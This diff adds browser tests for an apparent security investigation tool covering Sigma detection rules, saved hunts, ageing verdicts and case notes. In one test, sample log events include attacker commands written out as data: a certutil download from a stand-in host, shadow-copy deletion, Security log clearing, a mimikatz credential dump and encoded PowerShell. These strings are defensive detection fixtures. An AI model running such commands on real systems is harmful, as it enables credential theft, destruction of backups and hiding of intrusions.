@@ -580,3 +580,163 @@ test('rule packs: a downloaded zip comes back with tests and history; identical 
   expect(bad).toEqual({ title: '<img src=x onerror=alert(1)>', refs: ['https://ok.example'], sev: 'medium', v: 0, h: 0 });
   noErrors(errors);
 });
+
+test('the fast rule pre-check finds exactly what evaluating every rule on every event finds', async ({ page }) => {
+  const errors = await open(page, '#/detections');
+  const R = await page.evaluate(() => {
+    // the demo evidence, every built-in sample, and tricky variants: JSON-escaped paths, case changes, filters, wildcards, keywords
+    const extra = ['{"Image":"C:\\\\Windows\\\\System32\\\\cmd.exe","CommandLine":"cmd.exe /c whoami /all","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE"}',
+      'EventID=1 Image="C:\\WINDOWS\\SYSTEM32\\CERTUTIL.EXE" CommandLine="certutil -urlcache -split -f http://x.example/a.exe a.exe"',
+      'EventID=4688 New Process Name: C:\\Windows\\System32\\vssadmin.exe Process Command Line: vssadmin delete shadows /all /quiet',
+      'EventID=1 Image=C:\\Windows\\System32\\rundll32.exe CommandLine="rundll32.exe C:\\Users\\a\\AppData\\Local\\Temp\\x.dll,Start"',
+      'EventID=1 Image=C:\\Windows\\System32\\schtasks.exe CommandLine="schtasks /create /sc minute /tn Updater /tr C:\\ProgramData\\u.exe"',
+      'EventID=1 Image=C:\\Windows\\System32\\wevtutil.exe CommandLine="wevtutil cl Security"', 'EventID=1 Image=C:\\Windows\\System32\\net.exe CommandLine="net user /domain"',
+      'allow tcp 10.0.0.5:51022 -> 203.0.113.47:4444', 'mimikatz sekurlsa::logonpasswords', 'x'.repeat(30000) + ' powershell -enc SQBFAFgA'];
+    const recs = [...DB.records.filter(r => r.type !== 'lead'), ...extra.map((b, i) => ({ id: 'q' + i, title: 'T' + i, body: b, host: '', source: '', ents: [], tags: [] }))];
+    (DB.rules.filter(r => r.tests).flatMap(r => r.tests) || []).forEach((t, i) => recs.push({ id: 't' + i, title: '', body: t.text, host: '', source: '', ents: [], tags: [] }));
+    /* an event built from each rule's own values, so most rules have something to fire on */
+    DB.rules.filter(r => r.type === 'sigma').forEach((r, i) => { let p; try { p = sigmaParse(r.code); } catch (e) { return; }
+      const kv = []; for (const [name, sel] of Object.entries(p.det)) { if (/filter/i.test(name)) continue; for (const fd of sel.fields) { const [f, ...m] = fd.f.split('|'), v = String(fd.vals[0] || '').replace(/\*/g, '');
+          const val = m.includes('endswith') ? 'C:\\Windows\\' + v.replace(/^\\/, '') : m.includes('startswith') ? v + 'x' : m.includes('contains') ? 'a ' + v + ' b' : v; kv.push(f + '="' + val.replace(/"/g, "'") + '"'); } break; }
+      if (kv.length) recs.push({ id: 'g' + i, title: '', body: kv.join(' '), host: '', source: '', ents: [], tags: [] }); });
+    const F = recs.map(recFields), I = sigmaIndex(F); let diff = [], checked = 0, hits = 0;
+    for (const r of DB.rules.filter(r => r.type === 'sigma')) { let p; try { p = sigmaParse(r.code); } catch (e) { continue; } if (!p.cond) continue;
+      const full = new Set(); F.forEach((f, i) => { try { if (sigmaEval(p, f)) full.add(i); } catch (e) {} });
+      const C = sigmaCands(I, p), fast = new Set([...(C || F.keys())].filter(i => { try { return sigmaEval(p, F[i]); } catch (e) { return false; } }));
+      checked++; hits += full.size; if (full.size !== fast.size || [...full].some(i => !fast.has(i))) diff.push(r.title); }
+    return { checked, hits, diff, covered: DB.rules.filter(r => r.type === 'sigma').filter(r => { try { return !!sigmaNeedles(sigmaParse(r.code)); } catch (e) { return false; } }).length };
+  });
+  expect(R.diff).toEqual([]);
+  expect(R.checked).toBeGreaterThan(300); expect(R.hits).toBeGreaterThan(50);       // it was a real test: many rules fired
+  expect(R.covered).toBeGreaterThan(280);                                          // and most rules use the fast path
+  noErrors(errors);
+});
+
+test('every action name belongs to exactly one feature', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const R = await page.evaluate(() => ({ conflicts: actConflicts(), n: actIndex().size, maps: ACT_MAPS.filter(n => !ACT_GET[n]()) }));
+  expect(R.maps).toEqual([]);                      // every listed map exists
+  expect(R.n).toBeGreaterThan(300);
+  expect(R.conflicts).toEqual([]);
+  noErrors(errors);
+});
+
+test('a rule at a glance: tests, history, where it fires and look-alikes in one line, each a click from the detail', async ({ page }) => {
+  const errors = await open(page, '#/detections');
+  await page.evaluate(() => {
+    const code = "title: Glance\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    s:\n        Image|endswith: '\\\\whoami.exe'\n    condition: s\nlevel: low";
+    const r = { id: 'r-gl', type: 'sigma', title: 'Glance', desc: '', code, severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], created: Date.now(), modified: Date.now(),
+      tests: [{ id: 't1', kind: 'hit', text: 'Image="C:\\\\Windows\\\\System32\\\\whoami.exe"' }, { id: 't2', kind: 'hit', text: 'Image="C:\\\\Windows\\\\notepad.exe"' }] };
+    DB.rules.unshift(r, { ...r, id: 'r-gl2', title: 'Glance twin', tests: [] }); rvKeep(r, { ...r, title: 'Glance' + ' v0', code: r.code + '\n' }); dlAfterSave(r);
+    UI.dview = 'rules'; UI.rule = 'r-gl'; UI.ropen = true; UI.rtab = 'rule'; renderMain();
+  });
+  const sum = page.locator('form.rx .rsum');
+  await expect(sum).toContainText('1 of 2 tests fail'); await expect(sum).toContainText('1 earlier version'); await expect(sum).toContainText('check all rules');
+  await sum.locator('[data-act=rsTab][data-v=tests]').click(); await expect(page.locator('#dlPane .dl-tests')).toBeVisible();
+  await sum.locator('[data-act=rsTab][data-v=history]').click(); await expect(page.locator('#dlPane .rv-t')).toBeVisible();
+  await sum.locator('[data-act=rsHealth]').click();
+  await expect(page.locator('form.rx .rsum')).toContainText('checked', { timeout: 30000 });
+  await expect(page.locator('form.rx .rsum')).toContainText('Like Glance twin');
+  noErrors(errors);
+});
+
+test('verdicts age: dated when set however they are set, IPs fade, hashes do not, old links count for less, and Today asks to recheck', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const ip = 'ipv4:198.51.100.77', hash = 'sha256:' + 'a'.repeat(64);
+  // set through the panel button and directly (as automations do): both get a date at the next save
+  await page.evaluate(k => { UI.sel = { kind: 'ent', id: k }; UI.inspOpen = true; renderAll(); }, ip);
+  await page.locator('#insp [data-act=entVerdict][data-v=malicious]').click();
+  await page.evaluate(h => { DB.verdicts[h] = 'malicious'; flush(); }, hash);
+  const R = await page.evaluate(([ip, h]) => ({ ipAt: !!verdictAt(ip), hAt: !!verdictAt(h), w: +verdictWeight(ip).toFixed(3), unknown: verdictWeight('ipv4:198.51.100.200') }), [ip, hash]);
+  expect(R).toEqual({ ipAt: true, hAt: true, w: 1, unknown: 1 });
+  // two hundred days later
+  const A = await page.evaluate(([ip, h]) => { const old = Date.now() - 200 * 864e5; DB.verdictAt[ip] = old; DB.verdictAt[h] = Date.now() - 900 * 864e5;
+    return { ip: +verdictWeight(ip).toFixed(2), hash: verdictWeight(h), stale: verdictStale(ip), hashStale: verdictStale(h) }; }, [ip, hash]);
+  expect(A).toEqual({ ip: 0.21, hash: 1, stale: true, hashStale: false });
+  await page.evaluate(() => renderAll());
+  await expect(page.locator('#insp .vd-age.stale')).toContainText('worth checking again');
+  // a link resting only on that old verdict is no longer "strong"
+  const L = await page.evaluate(ip => {
+    ['X', 'Y'].forEach(x => DB.cases.push({ id: 'c-v' + x, code: 'V-' + x, name: 'V ' + x, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }));
+    let i = 0; for (const c of ['c-vX', 'c-vY']) DB.records.push({ id: 'r-v' + (i++), caseId: c, type: 'evidence', title: 'x', body: 'beacon 198.51.100.77', ts: Date.now(), source: 's', host: '', tags: [], ents: extractRich('beacon 198.51.100.77'), addedAt: Date.now() });
+    rev++; const x = caseLinks('c-vX').find(l => l.c.id === 'c-vY'); const before = x.strength;
+    DB.verdictAt[ip] = Date.now(); rev++; const y = caseLinks('c-vX').find(l => l.c.id === 'c-vY');
+    DB.verdictAt[ip] = Date.now() - 200 * 864e5; rev++; return { old: before, fresh: y.strength, oldW: x.shared[0].w < y.shared[0].w }; }, ip);
+  expect(L).toEqual({ old: 'some', fresh: 'strong', oldW: true });
+  // Today asks to check it again; taking the verdict away drops its date
+  const T = await page.evaluate(() => todayItems().items.some(x => /verdict.*old/.test(x.t)));
+  expect(T).toBe(true);
+  await page.locator('#insp [data-act=entVerdict][data-v=""]').click(); await page.evaluate(() => flush());
+  expect(await page.evaluate(ip => verdictAt(ip), ip)).toBe(null);
+  noErrors(errors);
+});
+
+test('saved hunts: a search or a rule across all cases; what matched when saved is seen, later evidence is new on the hunt and on Today', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  await page.evaluate(() => { ['P', 'Q'].forEach(x => DB.cases.push({ id: 'c-h' + x, code: 'H-' + x, name: 'Hunt ' + x, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }));
+    let i = 0; const rec = (c, b, host) => DB.records.push({ id: 'r-h' + (i++), caseId: c, type: 'evidence', title: b.slice(0, 40), body: b, ts: Date.now() - 1e6 + i, source: 's', host: host || 'WS', tags: [], ents: extractRich(b), addedAt: Date.now() });
+    rec('c-hP', 'beacon to 198.51.100.66 port 443'); rec('c-hP', 'EventID=1 Image=C:\\Windows\\System32\\whoami.exe CommandLine="whoami /all"', 'DC01'); rec('c-hQ', 'ordinary event'); rev++;
+    UI.q = '198.51.100.66'; UI.ast = E.parseQuery(UI.q); UI.tlMode = 'events'; go(caseHash('c-hP', 'timeline')); });
+  // save the timeline filter as a hunt
+  await page.click('[data-act=huSave]'); await page.fill('#huName', 'C2 comes back'); await page.click('#dlg [type=submit]');
+  await expect(page.locator('#toastMsg')).toContainText('1 match now');
+  // and a rule hunt from the dialog
+  await page.click('[data-act=huNew]'); await page.fill('#huName', 'Whoami anywhere'); await page.click('[data-act=huKind][data-v=rule]');
+  const rt = await page.evaluate(() => { const r = DB.rules.find(x => x.type === 'sigma' && /whoami/i.test(x.code) && (() => { try { const p = sigmaParse(x.code); return sigmaEval(p, recFields(DB.records.find(r => r.id === 'r-h1'))); } catch (e) { return false; } })()); return r && r.title; });
+  expect(rt).toBeTruthy(); await page.fill('#huR', rt); await page.click('#dlg [type=submit]');
+  // duplicates and empty searches are refused
+  await page.click('[data-act=huNew]'); await page.fill('#huName', 'c2 comes  BACK'); await page.fill('#huQ', 'x'); await page.click('#dlg [type=submit]'); await expect(page.locator('#dlg .ferr')).toContainText('already exists');
+  await page.fill('#huName', 'Another'); await page.fill('#huQ', ''); await page.click('#dlg [type=submit]'); await expect(page.locator('#dlg .ferr')).toContainText('Write what to look for'); await page.click('#dlg [data-act=dclose]');
+  expect(await page.evaluate(() => huntList().map(h => [h.name, huntRun(h).matches.length, huntRun(h).fresh.length]))).toEqual([['C2 comes back', 1, 0], ['Whoami anywhere', 1, 0]]);
+  // new evidence in another case: new on the hunt and on Today
+  await page.evaluate(() => { DB.records.push({ id: 'r-hnew', caseId: 'c-hQ', type: 'evidence', title: 'Proxy saw 198.51.100.66', body: 'GET http://198.51.100.66/a', ts: Date.now(), source: 'proxy', host: 'PX', tags: [], ents: extractRich('GET http://198.51.100.66/a'), addedAt: Date.now() }); mutate('new'); renderMain(); });
+  await expect(page.locator('.hu:has-text("C2 comes back") .chip.red').first()).toContainText('1 new');
+  await expect(page.locator('.hu:has-text("C2 comes back") .hu-c')).toContainText('H-Q');
+  expect(await page.evaluate(() => todayItems().items.some(x => /Hunt “C2 comes back”: 1 new match/.test(x.t)))).toBe(true);
+  // open the case from the hunt: the timeline is filtered by the same search
+  await page.locator('.hu:has-text("C2 comes back") [data-act=huCase][data-v=c-hQ]').click();
+  expect(await page.evaluate(() => [UI.q, UI.tlMode, !!UI.ast])).toEqual(['198.51.100.66', 'events', true]);
+  await page.evaluate(() => { UI.dview = 'hunts'; go('#/detections'); });
+  await page.locator('.hu:has-text("C2 comes back") [data-act=huSeen]').click();
+  expect(await page.evaluate(() => huntRun(huntList()[0]).fresh.length)).toBe(0);
+  // a deleted rule is said, not crashed on; delete with undo
+  await page.evaluate(() => { const h = huntList()[1]; DB.rules = DB.rules.filter(r => r.id !== h.ruleId); mutate('x'); renderMain(); });
+  await expect(page.locator('.hu:has-text("Whoami anywhere")')).toContainText('The rule was deleted');
+  await page.locator('.hu:has-text("Whoami anywhere") [data-act=huDel]').click(); expect(await page.evaluate(() => huntList().length)).toBe(1);
+  await page.click('#toastBtn'); expect(await page.evaluate(() => huntList().length)).toBe(2);
+  // junk from a backup is tidied
+  expect(await page.evaluate(() => { DB.hunts = [...DB.hunts, null, { id: 'x', name: 'bad', kind: 'query', q: '' }, { id: 'y', name: 5 }]; return huntList().length; })).toBe(2);
+  noErrors(errors);
+});
+
+test('a note from selected events: a plain-words summary, the chronology with citations that open each event, and a filter to all of them', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const ids = await page.evaluate(() => { const D = derive('c-lantern'), L = D.recs.filter(r => r.type !== 'lead' && r.ts).sort((a, b) => a.ts - b.ts);
+    const pick = [L.find(r => /invoice email/i.test(r.title)), L.find(r => /LNK opened/i.test(r.title)), ...L.filter(r => /beacon/i.test(r.title)).slice(0, 2)].filter(Boolean).map(r => r.id);
+    DB.active = 'c-lantern'; UI.tlMode = 'events'; UI.tlSel = true; UI.evPick = new Set(pick); go(caseHash('c-lantern', 'timeline')); return pick; });
+  expect(ids.length).toBe(4);
+  await page.click('[data-act=evNote]');
+  const n = await page.evaluate(() => { const n = DB.notes[0]; return { title: n.title, text: n.text, refs: n.refs, caseId: n.caseId }; });
+  expect(n.caseId).toBe('c-lantern'); expect(n.refs).toEqual(ids);
+  expect(n.text).toMatch(/^4 events on .+, 2026-09-14 08:52:10 to .+\(/);          // the opening sentence: count, hosts, span
+  expect(n.text).toMatch(/They pass through .*→/); expect(n.text).toMatch(/marked malicious: /);
+  expect(n.text).toMatch(/## Chronology\n- 08:52:10 MX01 — Invoice email delivered to finance \[1\]/); expect(n.text).toContain('[4]');
+  // on the notes page the citations are links
+  await page.evaluate(() => go('#/notes'));
+  const card = page.locator('.note-card', { has: page.locator('.ncite') }).first();
+  await expect(card.locator('.ncite')).toHaveCount(4);
+  await card.locator('.ncite').nth(1).click();
+  expect(await page.evaluate(i => [UI.route.tab, UI.sel && UI.sel.id], ids[1])).toEqual(['timeline', ids[1]]);
+  // all cited events, as a timeline filter that can be cleared
+  await page.evaluate(() => go('#/notes')); await page.locator('.note-card [data-act=nCiteAll]').first().click();
+  await expect(page.locator('.tlbar')).toContainText('4 events a note cites');
+  expect(await page.evaluate(() => derive('c-lantern').recs.filter(passes).length)).toBe(4);
+  await page.click('[data-act=idsOff]'); expect(await page.evaluate(() => !!UI.facet.ids)).toBe(false);
+  // editing the note keeps its citations; a deleted event's citation stays plain text
+  const nid = await page.evaluate(() => DB.notes[0].id);
+  await page.evaluate(i => noteDlg(i), nid); await page.fill('#nTitle', 'Initial access to C2'); await page.click('#dlg [type=submit]');
+  expect(await page.evaluate(() => DB.notes[0].refs.length)).toBe(4);
+  await page.evaluate(i => { DB.records = DB.records.filter(r => r.id !== i); mutate('x'); go('#/notes'); }, ids[3]);
+  await expect(page.locator('.note-card:has-text("Initial access to C2") .ncite')).toHaveCount(3);
+  noErrors(errors);
+});
